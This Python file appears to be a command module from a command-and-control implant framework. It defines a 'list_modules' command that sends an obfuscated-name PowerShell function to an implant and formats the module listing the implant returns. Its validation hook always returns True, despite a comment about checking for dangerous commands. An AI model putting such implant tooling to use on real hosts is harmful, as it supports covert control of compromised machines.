class GetLoadedModules:
    type = "ML"
    args = None
    input = "list_modules"

    def process_implant_response(self, data, args):
        return f"Module listing: \n{data.decode()}", None

    def implant_text(self):
        var = '''
function {{ ron.obf_get_loaded_modules }} () {
    $global:tr = Get-Command | Where {$_.Source -Like "FC2"}
}'''
        return var

    def pre_process_command(self, argument_string):
        # Check if the argument to be passed to the implant is valid.
        # I.e.
        #    Does the file to be uploaded exist local?
        #    Is the command to be executed dangerous?
        return True
